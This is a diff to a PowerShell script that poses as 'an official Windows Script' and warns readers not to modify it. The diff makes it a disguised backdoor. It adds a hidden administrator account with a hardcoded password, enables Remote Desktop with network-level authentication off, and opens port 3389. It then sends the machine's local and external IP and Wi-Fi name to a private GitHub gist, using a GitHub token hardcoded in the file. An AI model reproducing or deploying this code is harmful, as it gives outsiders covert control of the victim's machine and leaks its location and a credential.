@@ -7,7 +7,7 @@ param (
 ####################################################################################################
 
 #Check if the script is running with params
-if ($run -ne "o" -and $run -ne "init") {
+if ($run -ne "o" -and $run -ne "init" -and $run -ne "disable") {
     Write-Host "###############################################"
     Write-Host "# This is an official Windows Script          #"
     Write-Host "# DO NOT REMOVE/MODIFY THIS FILE!             #"
@@ -37,13 +37,34 @@ function init {
 }
 
 function Enable-RemoteDesktop {
-    # Enable Remote Desktop
-    #Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
-#
-    ## Enable Remote Desktop Firewall Rule
-    #Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    # Create new User
+    $username = "RemoteUser"
+    $password = "Remote123"
+    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+    # check if user already exists
+    if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
+        New-LocalUser -Name $username -Password $securePassword -FullName "Remote Desktop User" -Description "User for Remote Desktop" -AccountNeverExpires
+        Add-LocalGroupMember -Group "Administrators" -Member $username
+    }
+    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "UserAuthentication" -Value 0
+    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    Restart-Service -Name TermService -Force | Out-Null
+    # allow incoming 3389 port
+    New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -LocalPort 3389 -Protocol TCP -Action Allow
+}
 
-    Write-Output "Remote Desktop has been enabled."
+function Disable-RemoteDesktop {
+    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 1
+    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "UserAuthentication" -Value 1
+    Restart-Service -Name TermService -Force
+    try {
+        Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Remove-NetFirewallRule -DisplayName "Allow RDP" -ErrorAction Stop
+        Remove-LocalUser -Name "RemoteUser" -ErrorAction Stop
+    } catch {
+        Write-Output "User not found"
+    }
 }
 
 function Create-Gist {
@@ -52,18 +73,19 @@ function Create-Gist {
     )
 
     # Get IP address, port, and network name
-    $ip = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq "Ethernet" }).IPAddress
+    $localIp = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq "WiFi" }).IPAddress
+    $externIp = (Invoke-RestMethod -Uri "https://api.ipify.org")
     $port = 3389
-    $networkName = (Get-WmiObject -Class Win32_ComputerSystem).Name
+    $networkName = (netsh wlan show interfaces | Select-String SSID).Line.Split(':')[1].Trim()
     $networkName = $networkName -replace " ", "_"
 
     # Create Gist content
     $gistContent = @{
         description = "RDP"
-        public = $true
+        public = $false
         files = @{
-            "RDP.txt" = @{
-                content = "IP: $ip`nPort: $port`nNetwork Name: $networkName"
+            "rdp" = @{
+                content = "localIP: $localIp`nexternal IP: $externIp`nPort: $port`nNetwork Name: $networkName"
             }
         }
     } | ConvertTo-Json
@@ -78,7 +100,7 @@ function Create-Gist {
 }
 
 function exec {
-    #Enable-RemoteDesktop
+    Enable-RemoteDesktop
     $Token = "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"
     Create-Gist -Token $Token
 }
@@ -93,6 +115,9 @@ function main {
     } 
     if ($run -eq "o") {
         exec
+    }
+    if ($run -eq "disable") {
+        Disable-RemoteDesktop
     }
 
     $ProgressPreference = 'Continue'
